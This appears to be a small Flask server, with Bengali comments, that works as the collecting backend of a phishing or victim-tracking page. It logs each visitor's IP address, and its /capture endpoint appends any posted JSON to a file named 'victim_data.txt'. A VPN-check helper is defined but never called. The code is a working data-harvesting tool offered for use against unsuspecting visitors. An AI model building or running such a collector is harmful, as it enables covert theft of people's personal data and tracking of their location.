from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

def is_vpn(ip):
    try:
        # ভিপিএন চেক করার ফ্রি এপিআই
        res = requests.get(f"https://ipapi.co/{ip}/json/").json()
        if res.get('security', {}).get('vpn') or res.get('proxy'):
            return True
        return False
    except: return False

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # ভিপিএন ডিটেকশন সিমুলেশন ও চেক
    return render_template('index.html', ip=ip)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    with open("victim_data.txt", "a") as f:
        f.write(f"DATA: {data}\n")
    return {"status": "success"}

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
